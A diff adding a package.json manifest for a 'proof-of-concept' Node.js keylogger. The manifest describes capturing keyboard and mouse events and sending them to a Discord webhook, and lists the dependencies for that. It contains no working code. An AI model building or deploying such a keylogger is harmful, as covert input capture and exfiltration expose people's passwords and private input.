@@ -1,0 +1,29 @@
+{
+  "name": "nodejs-keylogger-poc",
+  "version": "1.0.0",
+  "description": "A proof-of-concept Node.js keylogger that captures and analyzes keyboard and mouse input events, and sends the data to a Discord webhook. Includes features for analyzing key patterns.",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "keywords": [
+    "keylogger",
+    "input-capture",
+    "iohook",
+    "node-fetch",
+    "single-instance",
+    "key-logger",
+    "keyboard-monitor",
+    "mouse-monitor",
+    "event-listener",
+    "automation",
+    "key-pattern-analysis"
+  ],
+  "author": "Tommy Sarkissian",
+  "license": "BSD-3-Clause",
+  "dependencies": {
+    "iohook": "^0.7.2",
+    "node-fetch-commonjs": "^3.3.2",
+    "single-instance": "0.0.1"
+  }
+}
